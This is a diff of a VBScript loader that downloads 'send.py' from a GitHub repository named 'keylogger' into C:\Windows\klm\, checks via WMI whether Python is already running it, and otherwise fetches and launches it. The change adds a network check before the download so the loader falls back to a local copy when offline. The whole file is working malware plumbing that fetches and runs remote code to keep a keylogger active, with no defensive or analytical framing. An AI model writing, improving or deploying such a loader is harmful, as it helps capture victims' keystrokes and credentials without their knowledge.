@@ -1,5 +1,5 @@
 Set objFSO = CreateObject("Scripting.FileSystemObject")
-strURL = "https://raw.githubusercontent.com/chakibarrama/keylogger/main/send.py"  ' Adjust URL as needed
+strURL = "https://raw.githubusercontent.com/chakibarrama/keylogger/main/send.py"
 strLocalFile = "C:\Windows\klm\send.py"
 strLogFile = "C:\Windows\klm\send.log"
 
@@ -36,6 +36,20 @@ Function DownloadFile(strURL, strLocalFile)
     Set objStream = Nothing
 End Function
 
+' Function to check for network connection
+Function IsNetworkAvailable()
+    On Error Resume Next
+    Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP")
+    objXMLHTTP.open "HEAD", "http://www.google.com", False
+    objXMLHTTP.send()
+    If objXMLHTTP.Status = 200 Then
+        IsNetworkAvailable = True
+    Else
+        IsNetworkAvailable = False
+    End If
+    Set objXMLHTTP = Nothing
+End Function
+
 ' Check if the Python script 'send.py' is specifically running
 Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
 Set colProcessList = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name = 'pythonw.exe' OR Name = 'python.exe'")
@@ -54,9 +68,15 @@ Next
 If isRunning Then
     LogMessage "Script send.py is already running."
 Else
-    LogMessage "send.py is not running. Attempting to download and execute."
-    If Not DownloadFile(strURL, strLocalFile) Then
-        LogMessage "Running the existing script due to failed download."
+    LogMessage "send.py is not running."
+
+    If IsNetworkAvailable() Then
+        LogMessage "Network connection detected. Attempting to download send.py."
+        If Not DownloadFile(strURL, strLocalFile) Then
+            LogMessage "Failed to download send.py. Running the existing script."
+        End If
+    Else
+        LogMessage "No network connection. Running the existing script."
     End If
 
     Set WshShell = CreateObject("WScript.Shell")
